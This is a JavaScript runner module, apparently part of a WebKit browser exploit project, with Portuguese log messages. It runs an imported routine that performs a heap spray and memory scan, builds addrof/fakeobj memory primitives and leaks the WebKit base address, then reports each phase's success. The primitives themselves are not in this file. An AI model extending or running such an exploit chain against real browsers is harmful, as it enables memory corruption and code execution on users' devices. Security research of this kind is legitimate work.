// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 43n - Heap Spray)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43, 
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim_R43n() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43n"; 
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R43n: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}_R43n: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R43n: Teste completado.`, "good", FNAME_RUNNER);
        
        const { heap_scan, primitives, webkit_leak } = result;
        
        if (heap_scan) {
            logS3(`  RUNNER R43n: Fase 2 - Memory Scan: ${heap_scan.msg}`, heap_scan.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        
        if (primitives) {
            logS3(`  RUNNER R43n: Fase 3 - Construção de Primitivas: ${primitives.msg} (addrof: ${primitives.addrof}, fakeobj: ${primitives.fakeobj})`, primitives.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (webkit_leak) {
            logS3(`  RUNNER R43n: Fase 4 - Vazamento da Base do WebKit: ${webkit_leak.msg} (Base Candidata: ${webkit_leak.webkit_base || 'N/A'})`, webkit_leak.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (webkit_leak?.success) {
            document.title = `${module_name_for_title}_R43n: WebKitLeak SUCCESS!`;
        } else if (primitives?.success) {
            document.title = `${module_name_for_title}_R43n: Primitives OK`;
        } else if (heap_scan?.success) {
            document.title = `${module_name_for_title}_R43n: HeapScan OK`;
        } else {
            document.title = `${module_name_for_title}_R43n: Test Fail`;
        }
    } else {
        document.title = `${module_name_for_title}_R43n: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R43n (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R43n();
    logS3(`\n==== Script 3 R43n (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43n Done`;
    }
}
